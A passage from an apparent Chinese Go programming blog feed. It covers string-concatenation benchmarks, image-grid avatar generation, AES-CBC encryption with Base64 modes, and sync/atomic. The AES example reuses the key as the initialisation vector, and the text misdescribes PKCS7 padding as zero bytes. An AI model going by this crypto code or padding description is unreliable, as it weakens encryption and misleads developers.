class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">func StringBuilder() string {</span><br><span class="line">    var b strings.Builder</span><br><span class="line">    b.WriteString("昵称")</span><br><span class="line">    b.WriteString(":")</span><br><span class="line">    b.WriteString("飞雪无情")</span><br><span class="line">    b.WriteString("\n")</span><br><span class="line">    b.WriteString("博客")</span><br><span class="line">    b.WriteString(":")</span><br><span class="line">    b.WriteString("http://www.flysnow.org/")</span><br><span class="line">    b.WriteString("\n")</span><br><span class="line">    b.WriteString("微信公众号")</span><br><span class="line">    b.WriteString(":")</span><br><span class="line">    b.WriteString("flysnow_org")</span><br><span class="line">    return b.String()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func BenchmarkStringBuilder(b *testing.B) {</span><br><span class="line">    for i:=0;i&lt;b.N;i++{</span><br><span class="line">        StringBuilder()</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>官方都说比buffer性能好了，我们看看性能测试的结果。</p><p>BenchmarkStringBuilder-8    10000000    170 ns/op   232 B/op    4 allocs/op<br>的确提升了，提升了一倍，虽然每次分配的内存次数有点多，但是每次分配的内存大小比buffer要少。</p><p>性能对比<br>以上就是常用的字符串拼接的方式，现在我们把这些测试结果，汇总到一起，对比下看看,因为Benchmark的测试，对于性能只显示，我把测试的时间设置为3s（秒），把时间拉长便于对比测试，同时生成了cpu profile文件，用于性能分析。</p><p>运行go test -bench=. -benchmem -benchtime=3s -cpuprofile=profile.out得到如下测试结果：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StringPlus-8    50000000    112 ns/op   144 B/op    2 allocs/op</span><br><span class="line">StringFmt-8     20000000    344 ns/op   80 B/op     1 allocs/op</span><br><span class="line">StringJoin-8    30000000    171 ns/op   160 B/op    2 allocs/op</span><br><span class="line">StringBuffer-8  20000000    302 ns/op   336 B/op    3 allocs/op</span><br><span class="line">StringBuilder-8 30000000    171 ns/op   232 B/op    4 allocs/op</span><br></pre></td></tr></tbody></table></figure><p>我们通过go tool pprof profile.out 看下我们输出的cpu profile信息。这里主要使用top命令。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Showing top 15 nodes out of 89</span><br><span class="line">      flat  flat%   sum%        cum   cum%</span><br><span class="line">    11.99s 42.55% 42.55%     11.99s 42.55%  runtime.kevent</span><br><span class="line">     6.30s 22.36% 64.90%      6.30s 22.36%  runtime.pthread_cond_wait</span><br><span class="line">     1.65s  5.86% 70.76%      1.65s  5.86%  runtime.pthread_cond_signal</span><br><span class="line">     1.11s  3.94% 74.70%      1.11s  3.94%  runtime.usleep</span><br><span class="line">     1.10s  3.90% 78.60%      1.10s  3.90%  runtime.pthread_cond_timedwait_relative_np</span><br><span class="line">     0.58s  2.06% 80.66%      0.62s  2.20%  runtime.wbBufFlush1</span><br><span class="line">     0.51s  1.81% 82.47%      0.51s  1.81%  runtime.memmove</span><br><span class="line">     0.44s  1.56% 84.03%      1.81s  6.42%  fmt.(*pp).printArg</span><br><span class="line">     0.39s  1.38% 85.42%      2.36s  8.37%  fmt.(*pp).doPrint</span><br><span class="line">     0.36s  1.28% 86.69%      0.70s  2.48%  fmt.(*buffer).WriteString (inline)</span><br><span class="line">     0.34s  1.21% 87.90%      0.93s  3.30%  runtime.mallocgc</span><br><span class="line">     0.20s  0.71% 88.61%      1.20s  4.26%  fmt.(*fmt).fmtS</span><br><span class="line">     0.18s  0.64% 89.25%      0.18s  0.64%  fmt.(*fmt).truncate</span><br><span class="line">     0.16s  0.57% 89.82%      0.16s  0.57%  runtime.memclrNoHeapPointers</span><br><span class="line">     0.15s  0.53% 90.35%      1.35s  4.79%  fmt.(*pp).fmtString</span><br></pre></td></tr></tbody></table></figure><p>前15个，可以看到fmt拼接的方式是最差的，因为fmt里很多方法耗时排在了最前面。buffer的WriteString方法也比较耗时。</p><p>以上的TOP可能还不是太直观，如果大家看火焰图的话，就会更清晰。性能最好的是+号拼接、Join拼接，最慢的是fmt拼接，这里的builder和buffer拼接差不多，并没有发挥出其能力。</p><p>总结<br>从整个性能的测试和分析来看，我们期待的builder并没有发挥出来，这是不是意味着builder不实用了呢？还不如+号和Join拼接呢？我们下一篇继续接着分析，这里提前透漏一些：比如:</p><p>拼接的字符串大小<br>拼接的字符串数量<br>以上这两个很关键，可以看下我上面的例子是属于哪一种。</p><p>好了，更深入具体的，请看下一篇字符串拼接分析。</p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-9宫格头像生成</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-9%E5%AE%AB%E6%A0%BC%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-9%E5%AE%AB%E6%A0%BC%E5%A4%B4%E5%83%8F%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h3 id="先看效果"><a href="#先看效果" class="headerlink" title="先看效果"></a>先看效果</h3><ul><li>头像间有间隔<br> <img src="https://img-blog.csdnimg.cn/20200303144245619.png" alt="在这里插入图片描述"></li><li>头像间无间隔<br> <img src="https://img-blog.csdnimg.cn/20200303144310558.png" alt="在这里插入图片描述"></li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ol><li><p>网络图片下载到本地</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">multiGetImages</span><span class="params">(urls []<span class="type">string</span>, dir <span class="type">string</span>, prefix <span class="type">string</span>)</span></span>(localPath []<span class="type">string</span>){</span><br><span class="line"><span class="keyword">var</span> w = sync.WaitGroup{}</span><br><span class="line">w.Add(<span class="built_in">len</span>(urls))</span><br><span class="line">timestamp := time.Now().UnixNano()</span><br><span class="line"><span class="keyword">for</span> i, url :=<span class="keyword">range</span> urls {</span><br><span class="line">name := fmt.Sprintf(<span class="string">"%s/%s_%d_%d.png"</span>, dir, prefix, timestamp, i)</span><br><span class="line">localPath = <span class="built_in">append</span>(localPath, name)</span><br><span class="line"><span class="keyword">go</span> downloadImage(url, name, &amp;w)</span><br><span class="line">}</span><br><span class="line">w.Wait()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">downloadImage</span><span class="params">(url <span class="type">string</span>, imgName <span class="type">string</span>, wg *sync.WaitGroup)</span></span>{</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line">out, err := os.Create(imgName)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">defer</span> out.Close()</span><br><span class="line">client := http.Client{Timeout: <span class="number">2</span> * time.Second}</span><br><span class="line">resp, err := client.Get(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">pix, err := ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">_, err = io.Copy(out, bytes.NewReader(pix))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>图片拼接</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">imageCompose</span><span class="params">(imagePath <span class="type">string</span>, localPaths []<span class="type">string</span>, gap <span class="type">int</span>)</span></span> {</span><br><span class="line">imageSize := <span class="number">80</span></span><br><span class="line">imageRow := <span class="type">int</span>(math.Sqrt(<span class="type">float64</span>(<span class="built_in">len</span>(localPaths)))) <span class="comment">// 根据传入图片数量判断行列数量</span></span><br><span class="line">imageCol := imageRow</span><br><span class="line">rowOffset := gap</span><br><span class="line">colOffset := gap</span><br><span class="line">backImg := imaging.New(imageSize*imageRow+gap*(imageCol+<span class="number">1</span>), imageSize*imageCol+gap*(imageRow+<span class="number">1</span>), color.NRGBA{<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>})</span><br><span class="line">tempRow, tempCol := <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> tempRow &lt; imageRow+<span class="number">1</span> {</span><br><span class="line"><span class="keyword">for</span> tempCol &lt; imageCol+<span class="number">1</span> {</span><br><span class="line">imgIndex := imageCol*(tempRow<span class="number">-1</span>) + tempCol - <span class="number">1</span></span><br><span class="line">resizeImg, err := imaging.Open(localPaths[imgIndex])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(err)</span><br><span class="line">}</span><br><span class="line">resizeImg = imaging.Blur(imaging.Resize(resizeImg, imageSize, imageSize, imaging.Lanczos), <span class="number">2</span>) <span class="comment">// 加了模糊操作</span></span><br><span class="line">backImg = imaging.Paste(backImg, resizeImg, image.Pt((tempCol<span class="number">-1</span>)*imageSize+colOffset, (tempRow<span class="number">-1</span>)*imageSize+rowOffset))</span><br><span class="line">tempCol += <span class="number">1</span></span><br><span class="line">colOffset += gap</span><br><span class="line">}</span><br><span class="line">tempRow += <span class="number">1</span></span><br><span class="line">rowOffset += gap</span><br><span class="line">tempCol = <span class="number">1</span></span><br><span class="line">colOffset = gap</span><br><span class="line">}</span><br><span class="line">err := imaging.Save(backImg, imagePath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(err)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>删除临时图片</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeFile</span><span class="params">(filePaths []<span class="type">string</span>)</span></span>{</span><br><span class="line"><span class="keyword">for</span> _,url := <span class="keyword">range</span> filePaths{</span><br><span class="line">err := os.RemoveAll(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">fmt.Println(err)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 图片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你的AES加密结果相同吗</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-%E4%BD%A0%E7%9A%84AES%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C%E7%9B%B8%E5%90%8C%E5%90%97/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-%E4%BD%A0%E7%9A%84AES%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C%E7%9B%B8%E5%90%8C%E5%90%97/</url>
      
        <content type="html"><![CDATA[<h2 id="AES加密后的结果，数据接收方解不出来，是哪里的问题？"><a href="#AES加密后的结果，数据接收方解不出来，是哪里的问题？" class="headerlink" title="AES加密后的结果，数据接收方解不出来，是哪里的问题？"></a>AES加密后的结果，数据接收方解不出来，是哪里的问题？</h2><h4 id="AES的安全性："><a href="#AES的安全性：" class="headerlink" title="AES的安全性："></a>AES的安全性：</h4><blockquote><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>的意义上，只要存在一个方法，比<a href="https://zh.wikipedia.org/wiki/%E8%9B%AE%E5%8A%9B%E6%94%BB%E5%87%BB">穷举法</a>还要更有效率，就能被视为一种“破解”。故一个针对AES 128位密钥的攻击若“只”需要2^120^计算复杂度（少于穷举法　2^128^），128位密钥的AES就算被破解了。从应用的角度来看，这种程度的破解依然太不切实际。</p></blockquote><h4 id="AES加密方式有五种："><a href="#AES加密方式有五种：" class="headerlink" title="AES加密方式有五种："></a>AES加密方式有五种：</h4><ul><li><p>**电码本模式（Electronic Codebook Book (ECB)**，将整个明文分成若干段相同的小段，然后对每一小段进行加密。</p></li><li><p><strong>密码分组链接模式（Cipher Block Chaining (CBC)）</strong>，先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。</p><p>优点：能掩盖明文结构信息，保证相同密文可得不同明文，所以不容易主动攻击，安全性好于ECB，适合传输长度长的报文，是SSL和IPSec的标准。</p><p>缺点：（1）不利于并行计算；（2）传递误差——前一个出错则后续全错；（3）第一个明文块需要与一个初始化向量IV进行抑或，初始化向量IV的选取比较复杂。</p><p>初始化IV的选取方式：固定IV，计数器IV，随机IV（只能得到伪随机数，用的最多），瞬时IV（难以得到瞬时值）</p></li><li><p><strong>计算器模式（Counter (CTR)）</strong>, 完全的流模式。将瞬时值与计数器连接起来，然后对此进行加密产生密钥流的一个密钥块，再进行XOR操作 。</p></li><li><p><strong>密码反馈模式（Cipher FeedBack (CFB)）</strong></p></li><li><p><strong>输出反馈模式（Output FeedBack (OFB)）</strong>,密码算法的输出（指密码key而不是密文）会反馈到密码算法的输入中，OFB模式并不是通过密码算法对明文直接加密，而是通过将明文分组和密码算法的输出进行XOR来产生密文分组。</p></li></ul><h4 id="密钥长度三种："><a href="#密钥长度三种：" class="headerlink" title="密钥长度三种："></a>密钥长度三种：</h4><p>​密钥越长，安全强度越高，运算开销就会越大。</p><ul><li>AES-128：16byte</li><li>AES-192：24byte</li><li>AES-256：32byte</li></ul><h4 id="Padding："><a href="#Padding：" class="headerlink" title="Padding："></a>Padding：</h4><ul><li>PKCS5：PKCS5是指分组数据缺少几个字节，就在数据的末尾填充几个字节的几，比如缺少5个字节，就在末尾填充5个字节的5。</li><li>PKCS7：PKCS7是指分组数据缺少几个字节，就在数据的末尾填充几个字节的0，比如缺少7个字节，就在末尾填充7个字节的0。</li><li>NOPADDING：指不需要填充，也就是说数据的发送方肯定会保证最后一段数据也正好是16个字节。</li></ul><h4 id="实际使用中要注意的地方"><a href="#实际使用中要注意的地方" class="headerlink" title="实际使用中要注意的地方"></a>实际使用中要注意的地方</h4><ol><li>密钥、初始向量相同。</li><li>加密模式相同。</li><li>Padding模式相同。</li></ol><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">aesEncrypt</span><span class="params">(orig <span class="type">string</span>, key <span class="type">string</span>)</span></span> <span class="type">string</span> {</span><br><span class="line"><span class="comment">// 转成字节数组</span></span><br><span class="line">origData := []<span class="type">byte</span>(orig)</span><br><span class="line">k := []<span class="type">byte</span>(key)</span><br><span class="line"><span class="comment">// 分组秘钥</span></span><br><span class="line">block, err := aes.NewCipher(k)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="built_in">panic</span>(fmt.Sprintf(<span class="string">"key 长度必须 16/24/32长度: %s"</span>, err.Error()))</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 获取秘钥块的长度</span></span><br><span class="line">blockSize := block.BlockSize()</span><br><span class="line"><span class="comment">// 补全码</span></span><br><span class="line">origData = PKCS7Padding(origData, blockSize)</span><br><span class="line"><span class="comment">// 加密模式</span></span><br><span class="line">blockMode := cipher.NewCBCEncrypter(block, k[:blockSize])</span><br><span class="line"><span class="comment">// 创建数组</span></span><br><span class="line">cryted := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line"><span class="comment">// 加密</span></span><br><span class="line">blockMode.CryptBlocks(cryted, origData)</span><br><span class="line"><span class="keyword">return</span> base64.RawURLEncoding.EncodeToString(cryted)</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">aesDecrypt</span><span class="params">(cryted <span class="type">string</span>, key <span class="type">string</span>)</span></span> <span class="type">string</span> {</span><br><span class="line">crytedByte, _ := base64.RawURLEncoding.DecodeString(cryted)</span><br><span class="line">k := []<span class="type">byte</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分组秘钥</span></span><br><span class="line">block, err := aes.NewCipher(k)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="built_in">panic</span>(fmt.Sprintf(<span class="string">"key 长度必须 16/24/32长度: %s"</span>, err.Error()))</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 获取秘钥块的长度</span></span><br><span class="line">blockSize := block.BlockSize()</span><br><span class="line"><span class="comment">// 加密模式</span></span><br><span class="line">blockMode := cipher.NewCBCDecrypter(block, k[:blockSize])</span><br><span class="line"><span class="comment">// 创建数组</span></span><br><span class="line">orig := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(crytedByte))</span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">blockMode.CryptBlocks(orig, crytedByte)</span><br><span class="line"><span class="comment">// 去补全码</span></span><br><span class="line">orig = PKCS7UnPadding(orig)</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(orig)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="结束了吗？"><a href="#结束了吗？" class="headerlink" title="结束了吗？"></a>结束了吗？</h4><p>加密或解密结果通常是byte数组，需要进一步转换为字符串。这时候通常又有两种选择，<strong>hex</strong>和<strong>base64</strong>。如果使用了base64进行编码，那么还有一个需要双方约定的地方。</p><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><p>Base64编码好处：简短、不可读性，即所编码的数据不会被人用肉眼所直接看到。</p><p>注意：后端与js通信时base64模式的选择🐶</p><table><thead><tr><th>模式</th><th>区别</th><th>备注</th></tr></thead><tbody><tr><td>StdEncoding</td><td>字符串由A-Za-z0-9+/组成，字节长度不能被3整除，用=补足</td><td></td></tr><tr><td>RawStdEncoding</td><td>字符串由A-Za-z0-9+/组成，字节长度不能被3整除，不用=补足</td><td></td></tr><tr><td>URLEncoding</td><td>字符串由A-Za-z0-9-_组成，字节长度不能被3整除，用=补足</td><td></td></tr><tr><td>RawURLEncoding</td><td>字符串由A-Za-z0-9-_组成，字节长度不能被3整除，不用=补足</td><td></td></tr></tbody></table><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> encodeStd = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"><span class="keyword">const</span> encodeURL = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//编码</span></span><br><span class="line">base64.StdEncoding.EncodeToString(data)</span><br><span class="line">base64.StdEncoding.DecodeString(data)</span><br><span class="line">base64.RawStdEncoding.EncodeToString(data)</span><br><span class="line">base64.RawStdEncoding.DecodeString(data)</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">base64.URLEncoding.EncodeToString(data)</span><br><span class="line">base64.URLEncoding.DecodeString(data)</span><br><span class="line">base64.RawURLEncoding.EncodeToString(data)</span><br><span class="line">base64.RawURLEncoding.DecodeString(data)</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang sync/atomic包的原子操作是怎么保证的</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-sync-atomic%E5%8C%85%E7%9A%84%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E6%98%AF%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E7%9A%84/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-sync-atomic%E5%8C%85%E7%9A%84%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C%E6%98%AF%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<p>在Go语言标准库中，<code>sync/atomic</code>包将底层硬件提供的原子级内存操作封装成了Go的函数。</p><p><code>Mutex</code>由操作系统实现，而atomic包中的原子操作则由底层硬件直接提供支持。在CPU实现的指令集里，有一些指令直接封装进atomic包，这些指令在执行过程中是不允许中断的，因此原子操作可以在<code>lock-free</code>的情况下保证并发安全，并且它的性能也能做到随CPU个数的增多而线性扩展。</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>int32</li><li>int64</li><li>uint32</li><li>uint64</li><li>uintptr</li><li>unsafe.Pointer</li></ul><h3 id="操作类型"><a href="#操作类型" class="headerlink" title="操作类型"></a>操作类型</h3><ul><li><p>增或减 AddXXX</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*addr += delta</span><br><span class="line"><span class="keyword">return</span> *addr</span><br></pre></td></tr></tbody></table></figure></li><li><p>比较并交换 CompareAndSwapXXX</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> *addr == old {</span><br><span class="line">*addr = <span class="built_in">new</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>载入 LoadXXX</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> *addr</span><br></pre></td></tr></tbody></table></figure></li><li><p>存储 StoreXXX</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*addr = val</span><br></pre></td></tr></tbody></table></figure></li><li><p>交换 SwapXXX</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old = *addr</span><br><span class="line">*addr = <span class="built_in">new</span></span><br><span class="line"><span class="keyword">return</span> old</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="什么操作叫做原子操作？"><a href="#什么操作叫做原子操作？" class="headerlink" title="什么操作叫做原子操作？"></a>什么操作叫做原子操作？</h3><p>一个或者多个操作在CPU执行过程中不被中断的特性，称为原子性(atomicity)。这些操作对外表现成一个不可分割的整体，他们要么都执行，要么都不执行，外界不会看到他们只执行到一半的状态。而在现实世界中，CPU不可能不中断的执行一系列操作，但如果我们在执行多个操作时，能让他们的中间状态对外不可见，那我们就可以宣城他们拥有了“不可分割”的原子性。</p><p>在Go中，一条普通的赋值语句其实不是一个原子操作。列如，在32位机器上写int64类型的变量就会有中间状态，因为他会被拆成两次写操作(MOV)——写低32位和写高32位。</p><h3 id="用锁行不行？"><a href="#用锁行不行？" class="headerlink" title="用锁行不行？"></a>用锁行不行？</h3><p>原子操作由<strong>底层硬件</strong>支持，而锁则由操作系统的<strong>调度器</strong>实现。锁应当用来保护一段逻辑，对于一个变量更新的保护，原子操作通常会更有效率，并且更能利用计算机多核的优势，如果要更新的是一个复合对象，则应当使用<code>atomic.Value</code>封装好的实现。</p><h4 id="值类型操作"><a href="#值类型操作" class="headerlink" title="值类型操作"></a>值类型操作</h4><ul><li>如果一个线程刚写完低32位，还没来得及写高32位时，另一个线程读取了这个变量，那得到的就是一个毫无逻辑的中间变量，会导致程序出现诡异的bug。</li></ul><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在被操作值被频繁变更的情况下,CAS操作并不那么容易成功</span></span><br><span class="line"><span class="comment">//利用for循环以进行多次尝试</span></span><br><span class="line"><span class="keyword">var</span> value <span class="type">int32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addValue1</span><span class="params">(delta <span class="type">int32</span>)</span></span>{</span><br><span class="line"><span class="keyword">for</span>{</span><br><span class="line"><span class="comment">//在进行读取value的操作的过程中,其他对此值的读写操作是可以被同时进行的</span></span><br><span class="line"><span class="comment">//那么这个读操作很可能会读取到一个只被修改了一半的数据</span></span><br><span class="line">v := value</span><br><span class="line"><span class="keyword">if</span> atomic.CompareAndSwapInt32(&amp;value, v, v + delta){</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li>用Load函数防止只读取一半有效数据的发生</li></ul><figure class="highlight 